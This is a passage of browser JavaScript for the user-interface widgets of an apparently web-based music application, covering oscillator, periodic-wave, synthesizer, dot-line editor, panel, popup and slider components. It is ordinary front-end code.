	updateWave( prop, val ) {
		const [ w0, w1 ] = this._waves,
			gain = prop === "gain" ? val : +this.getAttribute( "gain" ),
			pan = prop === "pan" ? val : +this.getAttribute( "pan" );

		w0.type =
		w1.type = prop === "type" ? val : this.getAttribute( "type" );
		w0.amplitude = Math.min( gain * ( pan < 0 ? 1 : 1 - pan ), .95 );
		w1.amplitude = Math.min( gain * ( pan > 0 ? 1 : 1 + pan ), .95 );
		w0.draw();
		w1.draw();
	}

	// .........................................................................
	_changeOrder( n ) {
		this.dataset.order = n;
	}
	_changeType( type ) {
		this._elSelect.value = type;
	}
	_changeProp( prop, val ) {
		const [ sli, span ] = this._sliders[ prop ];

		sli.setValue( val );
		span.textContent = prop === "detune" ? val : val.toFixed( 2 );
	}

	// .........................................................................
	_initSlider( childNum, prop ) {
		const root = this._children[ childNum ],
			slider = root.firstChild.firstChild,
			elValue = root.lastChild;

		slider.oninput = this._oninputSlider.bind( this, prop );
		slider.onchange = val => this._dispatch( "change", prop, val );
		return Object.freeze( [ slider, elValue ] );
	}

	// events:
	// .........................................................................
	_onclickPrevNext( dir ) {
		const sel = this._elSelect,
			currOpt = sel.querySelector( `option[value="${ sel.value }"]` ),
			opt = dir < 0
				? currOpt.previousElementSibling
				: currOpt.nextElementSibling;

		if ( opt ) {
			sel.value = opt.value;
			this._onchangeSelect();
		}
	}
	_onchangeSelect() {
		const type = this._elSelect.value;

		clearTimeout( this._timeidType );
		this.updateWave( "type", type );
		this._dispatch( "liveChange", "type", type );
		this._timeidType = setTimeout( () => {
			if ( type !== this.getAttribute( "type" ) ) {
				this._dispatch( "change", "type", type );
			}
		}, 700 );
	}
	_onkeydownSelect( e ) {
		if ( e.key.length === 1 ) {
			e.preventDefault();
		}
	}
	_oninputSlider( prop, val ) {
		let val2 = val;

		if ( prop === "gain" ) {
			this.updateWave( "gain", val );
			val2 = val.toFixed( 2 );
		} else if ( prop === "pan" ) {
			this.updateWave( "pan", val );
			val2 = val.toFixed( 2 );
		}
		this._sliders[ prop ][ 1 ].textContent = val2;
		this._dispatch( "liveChange", prop, +val2 );
	}
}

customElements.define( "gsui-oscillator", gsuiOscillator );

Object.freeze( gsuiOscillator );

class gsuiPeriodicWave extends HTMLElement {
	constructor() {
		super();
		this._svg = GSUI.createElementNS( "svg", { preserveAspectRatio: "none" },
			this._polyline = GSUI.createElementNS( "polyline" )
		);
		this.type = "";
		this.delay =
		this.attack = 0;
		this.frequency =
		this.amplitude =
		this.duration = 1;
		this.width =
		this.height = 0;
		Object.seal( this );
	}

	// .........................................................................
	connectedCallback() {
		if ( !this.firstChild ) {
			this.classList.add( "gsuiPeriodicWave" );
			this.append( this._svg );
			this.resized();
		}
	}

	// .........................................................................
	resized() {
		const bcr = this.getBoundingClientRect(),
			w = ~~bcr.width,
			h = ~~bcr.height;

		this.width = w;
		this.height = h;
		this._svg.setAttribute( "viewBox", `0 0 ${ w } ${ h }` );
		if ( this.type ) {
			this.draw();
		}
	}
	draw() {
		if ( this.firstChild && this.type ) {
			const wave = gsuiPeriodicWave.cache[ this.type ];

			if ( wave ) {
				this._draw( wave );
			} else {
				console.error( `gsuiPeriodicWave: the wave "${ this.type }" is undefined...` );
			}
		}
	}
	_draw( wave ) {
		const dur = this.duration,
			w = this.width,
			h2 = this.height / 2,
			hz = this.frequency * dur,
			amp = -this.amplitude * .95 * h2,
			delX = w / dur * this.delay,
			attX = w / dur * this.attack,
			pts = new Float32Array( w * 2 );

		for ( let x = 0; x < w; ++x ) {
			let y = h2;

			if ( x > delX ) {
				const xd = x - delX,
					att = xd < attX ? xd / attX : 1;

				y += wave[ xd / w * 256 * hz % 256 | 0 ] * amp * att;
			}
			pts[ x * 2 ] = x;
			pts[ x * 2 + 1 ] = y;
		}
		this._polyline.setAttribute( "points", pts.join( " " ) );
	}

	// static:
	static getXFromWave( a, b, t ) {
		return a.reduce( ( val, ak, k ) => {
			const tmp = Math.PI * 2 * k * t;

			return val + ak * Math.cos( tmp ) + b[ k ] * Math.sin( tmp );
		}, 0 );
	}
	static addWave( name, real, imag ) {
		const cache = gsuiPeriodicWave.cache;

		if ( !cache[ name ] ) {
			const arr = [],
				fn = gsuiPeriodicWave.getXFromWave.bind( null, real, imag );

			for ( let x = 0; x < 256; ++x ) {
				arr.push( fn( x / 256 ) );
			}
			cache[ name ] = arr;
		}
	}
}

customElements.define( "gsui-periodicwave", gsuiPeriodicWave );

gsuiPeriodicWave.cache = {};

Object.freeze( gsuiPeriodicWave );

GSUI.setTemplate( "gsui-synthesizer", () => {
	return [
		GSUI.createElement( "div", { class: "gsuiSynthesizer-env" } ),
		GSUI.createElement( "div", { class: "gsuiSynthesizer-lfo" } ),
		GSUI.createElement( "div", { class: "gsuiSynthesizer-head gsuiSynthesizer-headOscs" },
			GSUI.createElement( "span", { class: "gsuiSynthesizer-headTitle" }, "oscillators" ),
			GSUI.createElement( "span", { class: "gsuiSynthesizer-label gsuiSynthesizer-labelPitch" }, "pitch" ),
			GSUI.createElement( "span", { class: "gsuiSynthesizer-label gsuiSynthesizer-labelPan" }, "pan" ),
			GSUI.createElement( "span", { class: "gsuiSynthesizer-label gsuiSynthesizer-labelGain" }, "gain" ),
		),
		GSUI.createElement( "div", { class: "gsuiSynthesizer-oscList" },
			GSUI.createElement( "button", { class: "gsuiSynthesizer-newOsc" },
				GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "plus" } ),
			),
		),
	];
} );

class gsuiSynthesizer extends HTMLElement {
	constructor() {
		const children = GSUI.getTemplate( "gsui-synthesizer" ),
			elOscList = children[ 3 ],
			elNewOsc = elOscList.firstChild;

		super();
		this._children = children;
		this._env =
		this._lfo = null;
		this._waveList = [];
		this._elOscList = elOscList;
		this._uiOscs = new Map();
		Object.seal( this );

		elNewOsc.onclick = this._onclickNewOsc.bind( this );
		new gsuiReorder( {
			rootElement: elOscList,
			direction: "column",
			dataTransferType: "oscillator",
			itemSelector: ".gsuiOscillator",
			handleSelector: ".gsuiOscillator-grip",
			parentSelector: ".gsuiSynthesizer-oscList",
			onchange: this._onchangeReorder.bind( this ),
		} );
	}

	// .........................................................................
	connectedCallback() {
		if ( !this.firstChild ) {
			this.classList.add( "gsuiSynthesizer" );
			this.append( ...this._children );
			this.querySelector( ".gsuiSynthesizer-env" ).append( this._env );
			this.querySelector( ".gsuiSynthesizer-lfo" ).append( this._lfo );
			this._children = null;
		}
	}

	// .........................................................................
	setEnvelope( env ) {
		this._env = env;
	}
	setLFO( lfo ) {
		this._lfo = lfo;
	}
	setWaveList( arr ) {
		this._waveList = arr;
		this._uiOscs.forEach( o => o.addWaves( arr ) );
	}
	getOscillator( id ) {
		return this._uiOscs.get( id );
	}

	// .........................................................................
	addOscillator( id, osc ) {
		const uiOsc = document.createElement( "gsui-oscillator" );

		this._uiOscs.set( id, uiOsc );
		uiOsc.addWaves( this._waveList );
		uiOsc.dataset.id = id;
		this._elOscList.append( uiOsc );
	}
	removeOscillator( id ) {
		const osc = this._uiOscs.get( id );

		if ( osc ) {
			osc.remove();
			this._uiOscs.delete( id );
		}
	}
	reorderOscillators( obj ) {
		gsuiReorder.listReorder( this._elOscList, obj );
	}

	// events:
	// .........................................................................
	_onclickNewOsc() {
		GSUI.dispatchEvent( this, "gsuiSynthesizer", "addOscillator" );
	}
	_onchangeReorder() {
		const oscs = gsuiReorder.listComputeOrderChange( this._elOscList, {} );

		GSUI.dispatchEvent( this, "gsuiSynthesizer", "reorderOscillator", oscs );
	}
}

customElements.define( "gsui-synthesizer", gsuiSynthesizer );

class gsuiDotline {
	constructor() {
		const root = document.createElement( "div" ),
			svg = document.createElementNS( "http://www.w3.org/2000/svg", "svg" ),
			polyline = document.createElementNS( "http://www.w3.org/2000/svg", "polyline" );

		this.rootElement = root;
		this.oninput =
		this.onchange = () => {};
		this._data = {};
		this._dots = {};
		this._dotsMoving = [];
		this._elSVG = svg;
		this._elPoly = polyline;
		this._opt = {};
		this._dotsId =
		this._svgW =
		this._svgH =
		this._pageX =
		this._pageY =
		this._dotMaxX =
		this._dotMinX =
		this._dotMaxY =
		this._dotMinY =
		this._mousebtn = 0;
		this._nlDots = root.getElementsByClassName( "gsuiDotline-dot" );
		this._rootBCR =
		this._activeDot =
		this._attached = false;
		this._mouseupDot = this._mouseupDot.bind( this );
		this._mousemoveDot = this._mousemoveDot.bind( this );
		Object.seal( this );

		svg.append( polyline );
		svg.setAttribute( "preserveAspectRatio", "none" );
		root.append( svg );
		root.className = "gsuiDotline";
		root.oncontextmenu = () => false;
		root.onmousedown = this._mousedown.bind( this );
		this.options( {
			x: "x",
			y: "y",
			step: 1,
			minX: 0,
			minY: 0,
			maxX: 150,
			maxY: 100,
			firstDotLinked: null,
			lastDotLinked: null,
			moveMode: "free",
		} );
	}

	attached() {
		this._attached = true;
		this.resize();
	}
	resize() {
		const { width: w, height: h } = this.updateBCR();

		this._svgW = w;
		this._svgH = h;
		this._elSVG.setAttribute( "viewBox", `0 0 ${ w } ${ h }` );
		this._drawPolyline();
	}
	options( obj ) {
		const opt = this._opt;

		Object.assign( opt, obj );
		if ( this._optionsRedrawNeeded( obj ) ) {
			opt.width = opt.maxX - opt.minX;
			opt.height = opt.maxY - opt.minY;
			this._drawPolyline();
			Object.values( this._dots ).forEach( d => {
				this._updateDotElement( d.id, d.x, d.y );
			} );
		}
		return opt;
	}
	updateBCR() {
		return this._rootBCR = this.rootElement.getBoundingClientRect();
	}
	change( diff ) {
		Object.entries( diff ).forEach( ( [ id, diffDot ] ) => {
			if ( !diffDot ) {
				if ( id in this._data ) {
					delete this._data[ id ];
					this._deleteDotElement( id );
				}
			} else {
				const opt = this._opt,
					dot = this._data[ id ],
					xs = opt.x,
					ys = opt.y,
					x = xs in diffDot ? this._epureNb( diffDot[ xs ], opt.minX, opt.maxX ) : dot ? dot.x : 0,
					y = ys in diffDot ? this._epureNb( diffDot[ ys ], opt.minY, opt.maxY ) : dot ? dot.y : 0;

				if ( dot ) {
					this._updateDotElement( id, x, y );
				} else {
					this._data[ id ] = { x, y };
					this._createDotElement( id );
					this._updateDotElement( id, x, y );
				}
			}
		} );
		this._drawPolyline();
	}

	// private:
	_optionsRedrawNeeded( o ) {
		return (
			"step" in o ||
			"minX" in o ||
			"minY" in o ||
			"maxX" in o ||
			"maxY" in o ||
			"firstDotLinked" in o ||
			"lastDotLinked" in o
		);
	}
	_sortDots( a, b ) {
		return a.x - b.x;
	}
	_drawPolyline() {
		const arr = [],
			dots = Object.values( this._dots ).sort( this._sortDots ),
			svgW = this._svgW,
			svgH = this._svgH,
			{
				minX, minY,
				width, height,
				firstDotLinked,
				lastDotLinked,
			} = this._opt;

		if ( firstDotLinked !== null ) {
			arr.push( 0, svgH - ( firstDotLinked - minY ) / height * svgH );
		}
		dots.forEach( dot => {
			arr.push(
				( dot.x - minX ) / width * svgW,
				svgH - ( dot.y - minY ) / height * svgH
			);
		} );
		if ( lastDotLinked !== null ) {
			arr.push( svgW, svgH - ( lastDotLinked - minY ) / height * svgH );
		}
		this._elPoly.setAttribute( "points", arr.join( " " ) );
	}
	_onchange() {
		const obj = {},
			data = this._data;
		let diff;

		Object.entries( data ).forEach( ( [ id, { x, y } ] ) => {
			const newDot = this._dots[ id ];

			if ( !newDot ) {
				diff = true;
				obj[ id ] = undefined;
				delete data[ id ];
			} else {
				const { x: nx, y: ny } = newDot;

				if ( nx !== x || ny !== y ) {
					const objDot = {};

					diff = true;
					obj[ id ] = objDot;
					if ( nx !== x ) { data[ id ].x = objDot[ this._opt.x ] = nx; }
					if ( ny !== y ) { data[ id ].y = objDot[ this._opt.y ] = ny; }
				}
			}
		} );
		Object.values( this._dots ).forEach( ( { id, x, y } ) => {
			const oldDot = data[ id ];

			if ( !oldDot ) {
				diff = true;
				data[ id ] = { x, y };
				obj[ id ] = {
					[ this._opt.x ]: x,
					[ this._opt.y ]: y,
				};
			}
		} );
		if ( diff ) {
			this.onchange( obj );
		}
	}

	// Math functions
	// .........................................................................
	_epurePageX( px ) {
		const o = this._opt,
			r = this._rootBCR;

		return ( px - r.left - window.scrollX ) / r.width * o.width + o.minX;
	}
	_epurePageY( py ) {
		const o = this._opt,
			r = this._rootBCR;

		return o.height - ( py - r.top - window.scrollY ) / r.height * o.height + o.minY;
	}
	_epureNb( n, min, max ) {
		const step = this._opt.step,
			cut = Math.max( min, Math.min( n, max ) );

		return +( Math.round( cut / step ) * step ).toFixed( 5 );
	}

	// dots[].element
	// .........................................................................
	_createDotElement( id ) {
		const el = document.createElement( "div" );

		el.className = "gsuiDotline-dot";
		el.dataset.id = id;
		this._dotsId = Math.max( this._dotsId, id );
		this.rootElement.append( el );
		return this._dots[ id ] = { id, element: el, x: 0, y: 0 };
	}
	_updateDotElement( id, x, y ) {
		const opt = this._opt,
			dot = this._dots[ id ];

		dot.x = x;
		dot.y = y;
		dot.element.style.left = `${ ( x - opt.minX ) / opt.width * 100 }%`;
		dot.element.style.top = `${ 100 - ( ( y - opt.minY ) / opt.height * 100 ) }%`;
	}
	_deleteDotElement( id ) {
		this._dots[ id ].element.remove();
		delete this._dots[ id ];
	}
	_selectDotElement( id, b ) {
		const dot = this._dots[ id ];

		this._activeDot = b ? dot : null;
		dot.element.classList.toggle( "gsuiDotline-dotSelected", b );
	}

	// events:
	// .........................................................................
	_toggleMouseEvents( b ) {
		if ( b ) {
			document.addEventListener( "mouseup", this._mouseupDot );
			document.addEventListener( "mousemove", this._mousemoveDot );
		} else {
			document.removeEventListener( "mouseup", this._mouseupDot );
			document.removeEventListener( "mousemove", this._mousemoveDot );
		}
	}
	_mousedown( e ) {
		let id = e.target.dataset.id;

		this._toggleMouseEvents( true );
		this._mousebtn = e.button;
		if ( e.button === 2 ) {
			if ( id ) {
				this._deleteDotElement( id );
				this._drawPolyline();
				this.oninput( id );
			}
		} else if ( e.button === 0 ) {
			let isAfter = false,
				dot,
				prevDot;

			this.updateBCR();
			if ( id ) {
				dot = this._dots[ id ];
			} else {
				const x = this._epurePageX( e.pageX ),
					y = this._epurePageY( e.pageY );

				id = this._dotsId + 1;
				dot = this._createDotElement( id );
				this._updateDotElement( id, x, y );
				this._drawPolyline();
				this.oninput( id, x, y );
			}
			this._selectDotElement( id, true );
			this._pageX = e.pageX;
			this._pageY = e.pageY;
			if ( this._opt.moveMode !== "linked" ) {
				this._dotsMoving = [ dot ];
				this._dotMaxX = dot.x;
				this._dotMaxY = dot.y;
				this._dotMinX = dot.x;
				this._dotMinY = dot.y;
			} else {
				this._dotMaxX =
				this._dotMaxY = -Infinity;
				this._dotMinX =
				this._dotMinY = Infinity;
				this._dotsMoving = Object.values( this._dots )
					.sort( this._sortDots )
					.filter( ( d, i, arr ) => {
						isAfter = isAfter || d === dot;
						if ( isAfter ) {
							this._dotMaxX = Math.max( d.x, this._dotMaxX );
							this._dotMaxY = Math.max( d.y, this._dotMaxY );
							this._dotMinX = Math.min( d.x, this._dotMinX );
							this._dotMinY = Math.min( d.y, this._dotMinY );
						}
						if ( arr[ i + 1 ] === dot ) {
							prevDot = d;
						}
						return isAfter;
					} );
				if ( prevDot ) {
					this._dotMinX -= prevDot.x;
				}
			}
			this._dotsMoving.forEach( dot => {
				dot._saveX = dot.x;
				dot._saveY = dot.y;
			} );
		}
	}
	_mouseupDot() {
		if ( this._activeDot ) {
			this._selectDotElement( this._activeDot.id, false );
		}
		this._toggleMouseEvents( false );
		this._dotsMoving.forEach( dot => {
			delete dot._saveX;
			delete dot._saveY;
		} );
		this._dotsMoving.length = 0;
		this._onchange();
	}
	_mousemoveDot( e ) {
		if ( this._mousebtn === 0 ) {
			const opt = this._opt;
			let incX = opt.width / this._rootBCR.width * ( e.pageX - this._pageX ),
				incY = opt.height / this._rootBCR.height * -( e.pageY - this._pageY );

			if ( incX ) {
				incX = incX < 0
					? Math.max( incX, opt.minX - this._dotMinX )
					: Math.min( incX, opt.maxX - this._dotMaxX );
			}
			if ( incY ) {
				incY = incY < 0
					? Math.max( incY, opt.minY - this._dotMinY )
					: Math.min( incY, opt.maxY - this._dotMaxY );
			}
			this._dotsMoving.forEach( dot => {
				const id = dot.id,
					x = this._epureNb( dot._saveX + incX, opt.minX, opt.maxX ),
					y = this._epureNb( dot._saveY + incY, opt.minY, opt.maxY );

				this._updateDotElement( id, x, y );
				this.oninput( id, x, y );
			} );
			this._drawPolyline();
		}
	}
}

class gsuiPanels {
	constructor( root ) {
		this.rootElement = root;
		this._cursorElem = document.createElement( "div" );
		this._cursorElem.className = "gsuiPanels-cursor";
		this._dataPerPanel = new Map();
	}
	attached() {
		this._init();
		this.resized();
	}
	resized() {
		this._panWidth.forEach( this._setSizeClass.bind( this, "width" ) );
		this._panHeight.forEach( this._setSizeClass.bind( this, "height" ) );
	}

	// private:
	_init() {
		const root = this.rootElement,
			qsa = ( c, fn ) => root.querySelectorAll( `.gsuiPanels-${ c }` ).forEach( fn );

		root.style.overflow = "hidden";
		qsa( "extend", el => el.remove() );
		qsa( "last", el => el.classList.remove( "gsuiPanels-last" ) );
		this._convertFlex( root.classList.contains( "gsuiPanels-x" ) ? "width" : "height", root );
		qsa( "x", this._convertFlex.bind( this, "width" ) );
		qsa( "y", this._convertFlex.bind( this, "height" ) );
		qsa( "x > div + div", this._addExtend.bind( this, "width" ) );
		qsa( "y > div + div", this._addExtend.bind( this, "height" ) );
		this._panWidth = root.querySelectorAll( "[data-width-class]" );
		this._panHeight = root.querySelectorAll( "[data-height-class]" );
		this._panWidth.forEach( this._parseSizeClassAttr.bind( this, "width" ) );
		this._panHeight.forEach( this._parseSizeClassAttr.bind( this, "height" ) );
		window.addEventListener( "resize", this.resized.bind( this ) );
	}
	_getChildren( el ) {
		return Array.from( el.children ).filter(
			el => !el.classList.contains( "gsuiPanels-extend" ) );
	}
	_parseSizeClassAttr( dir, pan ) {
		const hasData = this._dataPerPanel.get( pan ),
			data = hasData
				? hasData
				: {
					width: { less: [], more: [] },
					height: { less: [], more: [] },
				},
			{ less, more } = data[ dir ];

		if ( !hasData ) {
			this._dataPerPanel.set( pan, data );
		}
		pan.dataset[ `${ dir }Class` ].split( " " )
			.forEach( w => {
				const [ size, clazz ] = w.split( ":" ),
					arr = size[ 0 ] === "<" ? less : more;

				arr.push( [ +size.substr( 1 ), clazz ] );
			} );
	}
	_convertFlex( dir, panPar ) {
		const pans = this._getChildren( panPar ),
			size = dir === "width"
				? panPar.clientWidth
				: panPar.clientHeight;

		pans[ pans.length - 1 ].classList.add( "gsuiPanels-last" );
		pans.map( pan => pan.getBoundingClientRect()[ dir ] )
			.forEach( ( panW, i ) => {
				pans[ i ].style[ dir ] = `${ panW / size * 100 }%`;
			} );
	}
	_addExtend( dir, pan ) {
		const extend = document.createElement( "div" ),
			pans = this._getChildren( pan.parentNode ),
			panBefore = pans.filter( el => !el.classList.contains( "gsuiPanels-extend" ) &&
				pan.compareDocumentPosition( el ) & Node.DOCUMENT_POSITION_PRECEDING
			).reverse(),
			panAfter = pans.filter( el => !el.classList.contains( "gsuiPanels-extend" ) && (
				pan.compareDocumentPosition( el ) & Node.DOCUMENT_POSITION_FOLLOWING || pan === el
			) );

		extend.className = "gsuiPanels-extend";
		extend.onmousedown = this._onmousedownExtend.bind( this, dir, extend, panBefore, panAfter );
		pan.append( extend );
	}
	_incrSizePans( dir, mov, pans ) {
		const parentsize = this._parentSize;

		return pans.reduce( ( mov, pan ) => {
			let ret = mov;

			if ( Math.abs( mov ) > .1 ) {
				const style = getComputedStyle( pan ),
					size = pan.getBoundingClientRect()[ dir ],
					minsize = parseFloat( style[ `min-${ dir }` ] ) || 10,
					maxsize = parseFloat( style[ `max-${ dir }` ] ) || Infinity,
					newsizeCorrect = Math.max( minsize, Math.min( size + mov, maxsize ) );

				if ( Math.abs( newsizeCorrect - size ) >= .1 ) {
					pan.style[ dir ] = `${ newsizeCorrect / parentsize * 100 }%`;
					if ( mov > 0 ) {
						ret = mov - ( newsizeCorrect - size );
					} else {
						ret = mov + ( size - newsizeCorrect );
					}
					this._setSizeClass( dir, pan );
					if ( pan.onresizing ) {
						pan.onresizing( pan );
					}
				}
			}
			return ret;
		}, mov );
	}
	_setSizeClass( dir, pan ) {
		const panData = this._dataPerPanel.get( pan );

		if ( panData ) {
			const { less, more } = panData[ dir ],
				panCl = pan.classList,
				panSize = dir === "width"
					? pan.clientWidth
					: pan.clientHeight;

			less.forEach( c => panCl.toggle( c[ 1 ], panSize < c[ 0 ] ) );
			more.forEach( c => panCl.toggle( c[ 1 ], panSize > c[ 0 ] ) );
		}
	}

	// events:
	_onmouseup() {
		this._cursorElem.remove();
		this._extend.classList.remove( "gsui-hover" );
		this.rootElement.classList.remove( "gsuiPanels-noselect" );
		delete gsuiPanels._focused;
	}
	_onmousemove( e ) {
		const dir = this._dir,
			px = ( dir === "width" ? e.pageX : e.pageY ) - this._pageN,
			mov = px - this._incrSizePans( dir, px, this._panBefore );

		this._pageN += mov;
		if ( Math.abs( mov ) > 0 ) {
			this._incrSizePans( dir, -mov, this._panAfter );
		}
	}
	_onmousedownExtend( dir, ext, panBefore, panAfter, e ) {
		gsuiPanels._focused = this;
		ext.classList.add( "gsui-hover" );
		this._cursorElem.style.cursor = dir === "width" ? "col-resize" : "row-resize";
		document.body.append( this._cursorElem );
		this.rootElement.classList.add( "gsuiPanels-noselect" );
		this._dir = dir;
		this._extend = ext;
		this._pageN = dir === "width" ? e.pageX : e.pageY;
		this._panBefore = panBefore;
		this._panAfter = panAfter;
		this._parent = ext.parentNode.parentNode;
		this._parentSize = dir === "width"
			? this._parent.clientWidth
			: this._parent.clientHeight;
	}
}

document.addEventListener( "mousemove", e => {
	gsuiPanels._focused && gsuiPanels._focused._onmousemove( e );
} );
document.addEventListener( "mouseup", e => {
	gsuiPanels._focused && gsuiPanels._focused._onmouseup( e );
} );

GSUI.setTemplate( "gsui-popup", () => (
	GSUI.createElement( "div", { id: "gsuiPopup" },
		GSUI.createElement( "div", { id: "gsuiPopupWindow", tabindex: 0 },
			GSUI.createElement( "div", { id: "gsuiPopupHead" } ),
			GSUI.createElement( "form", { id: "gsuiPopupBody" },
				GSUI.createElement( "div", { id: "gsuiPopupContent" } ),
				GSUI.createElement( "div", { id: "gsuiPopupMessage" } ),
				GSUI.createElement( "input", { id: "gsuiPopupInputText", type: "text" } ),
				GSUI.createElement( "div", { id: "gsuiPopupBtns" },
					GSUI.createElement( "input", { type: "button", id: "gsuiPopupCancel", value: "Cancel" } ),
					GSUI.createElement( "input", { type: "submit", id: "gsuiPopupOk", value: "Ok" } ),
				),
			),
		),
	)
) );

const gsuiPopup = new class {
	constructor() {
		const qs = s => document.querySelector( `#gsuiPopup${ s }` );

		document.body.append( GSUI.getTemplate( "gsui-popup" ) );
		this.elRoot = qs( "" );
		this.elOk = qs( "Ok" );
		this.elCnt = qs( "Content" );
		this.elMsg = qs( "Message" );
		this.elText = qs( "InputText" );
		this.elForm = qs( "Body" );
		this.elWindow = qs( "Window" );
		this.elHeader = qs( "Head" );
		this.elCancel = qs( "Cancel" );
		this.clWindow = this.elWindow.classList;
		this.type = "";
		this.isOpen = false;
		this.resolve =
		this._fnSubmit = null;
		Object.seal( this );

		this.elRoot.onclick =
		this.elCancel.onclick = this._cancelClick.bind( this );
		this.elForm.onsubmit = this._submit.bind( this );
		this.elWindow.onkeyup =
		this.elWindow.onclick = e => { e.stopPropagation(); };
		this.elWindow.onkeydown = e => {
			if ( e.keyCode === 27 ) {
				this._cancelClick();
			}
			e.stopPropagation();
		};
	}

	alert( title, msg, ok ) {
		this._emptyCnt();
		this.clWindow.add( "gsuiPopup-noText", "gsuiPopup-noCancel" );
		this._setOkCancelBtns( ok, false );
		return this._open( "alert", title, msg );
	}
	confirm( title, msg, ok, cancel ) {
		this._emptyCnt();
		this.clWindow.remove( "gsuiPopup-noCancel" );
		this.clWindow.add( "gsuiPopup-noText" );
		this._setOkCancelBtns( ok, cancel );
		return this._open( "confirm", title, msg );
	}
	prompt( title, msg, val, ok, cancel ) {
		this._emptyCnt();
		this.clWindow.remove( "gsuiPopup-noText", "gsuiPopup-noCancel" );
		this._setOkCancelBtns( ok, cancel );
		return this._open( "prompt", title, msg, val );
	}
	custom( obj ) {
		this._emptyCnt();
		this._fnSubmit = obj.submit || null;
		this.clWindow.remove( "gsuiPopup-noText" );
		this._setOkCancelBtns( obj.ok, obj.cancel || false );
		obj.element
			? this.elCnt.append( obj.element )
			: Element.prototype.append.apply( this.elCnt, obj.elements );
		return this._open( "custom", obj.title );
	}
	close() {
		if ( this.isOpen ) {
			this.elCancel.click();
		}
	}

	// private:,
	_setOkCancelBtns( ok, cancel ) {
		this.clWindow.toggle( "gsuiPopup-noCancel", cancel === false );
		this.elCancel.value = cancel || "Cancel";
		this.elOk.value = ok || "Ok";
	}
	_emptyCnt() {
		const elCnt = this.elCnt;

		while ( elCnt.firstChild ) {
			elCnt.firstChild.remove();
		}
	}
	_open( type, title, msg, value ) {
		this.type = type;
		this.isOpen = true;
		this.elHeader.textContent = title;
		this.elMsg.innerHTML = msg || "";
		this.elText.value = arguments.length > 3 ? value : "";
		this.elWindow.dataset.type = type;
		this.elRoot.classList.add( "gsuiPopup-show" );
		setTimeout( () => {
			if ( type === "prompt" ) {
				this.elText.select();
			} else {
				const inp = type !== "custom" ? null
					: this.elCnt.querySelector( "input, select" );

				( inp || this.elOk ).focus();
			}
		}, 250 );
		return new Promise( res => this.resolve = res )
			.then( val => {
				this.isOpen = false;
				this.elRoot.classList.remove( "gsuiPopup-show" );
				return val;
			} );
	}
	_cancelClick() {
		this.resolve(
			this.type === "confirm" ? false :
			this.type === "prompt" ? null : undefined );
	}
	_submit() {
		switch ( this.type ) {
			case "alert": this.resolve( undefined ); break;
			case "prompt": this.resolve( this.elText.value ); break;
			case "confirm": this.resolve( true ); break;
			case "custom": this._submitCustom(); break;
		}
		return false;
	}
	_getInputValue( inp ) {
		switch ( inp.type ) {
			default: return inp.value;
			case "file": return inp.files;
			case "radio": return inp.checked ? inp.value : null;
			case "number": return +inp.value;
			case "checkbox": return inp.checked;
		}
	}
	_submitCustom() {
		const fn = this._fnSubmit,
			inps = Array.from( this.elForm ),
			obj = inps.reduce( ( obj, inp ) => {
				if ( inp.name ) {
					const val = this._getInputValue( inp );

					if ( val !== null ) {
						obj[ inp.name ] = val;
					}
				}
				return obj;
			}, {} );

		if ( !fn ) {
			this.resolve( obj );
		} else {
			const fnRes = fn( obj );

			if ( fnRes !== false ) {
				fnRes && fnRes.then
					? fnRes.then( res => {
						if ( res !== false ) {
							this.resolve( obj );
						}
					} )
					: this.resolve( obj );
			}
		}
	}
}();

GSUI.setTemplate( "gsui-slider", () => {
	return [
		GSUI.createElement( "input", { type: "range", class: "gsuiSlider-input" } ),
		GSUI.createElement( "div", { class: "gsuiSlider-line" },
			GSUI.createElement( "div", { class: "gsuiSlider-lineColor" } ),
		),
		GSUI.createElementNS( "svg", { class: "gsuiSlider-svg" },
			GSUI.createElementNS( "circle", { class: "gsuiSlider-svgLine" } ),
			GSUI.createElementNS( "circle", { class: "gsuiSlider-svgLineColor" } ),
		),
		GSUI.createElement( "div", { class: "gsuiSlider-eventCatcher" } ),
	];
} );

class gsuiSlider extends HTMLElement {
	constructor() {
		const [ input, ...html ] = GSUI.getTemplate( "gsui-slider" );

		super();
		this._min = 0;
		this._max = 100;
		this._step = 1;
		this._scrollStep = 1;
		this._wheelChange = false;
		this._mousemoveSize = 0;
		this._strokeWidth = 4;

		this.oninput =
		this.onchange =
		this.oninputend =
		this.oninputstart = null;

		this.value =
		this._previousval = "";
		this._enable = true;
		this._circ =
		this._axeX =
		this._locked =
		this._connected = false;
		this.width =
		this.height =
		this._pxval =
		this._pxmoved =
		this._svgLineLen = 0;
		this._children = html;
		this._elInput = input;
		this._elLine = html[ 0 ];
		this._elLineColor = this._elLine.firstElementChild;
		this._elSvg = html[ 1 ];
		this._elSvgLine = this._elSvg.firstElementChild;
		this._elSvgLineColor = this._elSvg.lastElementChild;
		Object.seal( this );

		this.onwheel = this._wheel.bind( this );
		this.onmouseup = this._mouseup.bind( this );
		this.onmousedown = this._mousedown.bind( this );
		this.onmousemove = this._mousemove.bind( this );
		this.onmouseleave = this._mouseleave.bind( this );
	}

	// .........................................................................
	connectedCallback() {
		this.classList.add( "gsuiSlider" );
		if ( this._children ) {
			const brc = this.getBoundingClientRect();

			this.append( ...this._children );
			this.width = brc.width;
			this.height = brc.height;
			this._children = null;
			this._connected = true;
			this._setSVGcirc();
			this._updateVal();
		}
	}
	static get observedAttributes() {
		return [ "type", "min", "max", "step", "scroll-step", "wheel-change", "mousemove-size", "stroke-width" ];
	}
	attributeChangedCallback( prop, prev, val ) {
		if ( prev !== val ) {
			let updateVal;

			switch ( prop ) {
				case "type":
					this._setType( val );
					this._setSVGcirc();
					updateVal = true;
					break;
				case "min":
					this._elInput.min = this._min = +val;
					updateVal = true;
					break;
				case "max":
					this._elInput.max = this._max = +val;
					updateVal = true;
					break;
				case "step":
					this._elInput.step = this._step = +val;
					updateVal = true;
					break;
				case "scroll-step":
					this._scrollStep = +val;
					break;
				case "wheel-change":
					this._wheelChange = typeof val === "string";
					break;
				case "mousemove-size":
					this._mousemoveSize = +val;
					break;
				case "stroke-width":
					this._strokeWidth = +val;
					this._setSVGcirc();
					break;
			}
			if ( updateVal ) {
				this._previousval = this._getInputVal();
				this._updateVal();
			}
		}
	}

	// .........................................................................
	setValue( val, bymouse ) {
		if ( !this._locked || bymouse ) {
			const prevVal = this._getInputVal(),
				newVal = ( this._elInput.value = val, this._getInputVal() );

			if ( newVal !== prevVal ) {
				this._updateVal();
				if ( bymouse && this.oninput ) {
					this.oninput( +newVal );
				}
			}
			if ( !bymouse ) {
				this._previousval = newVal;
			}
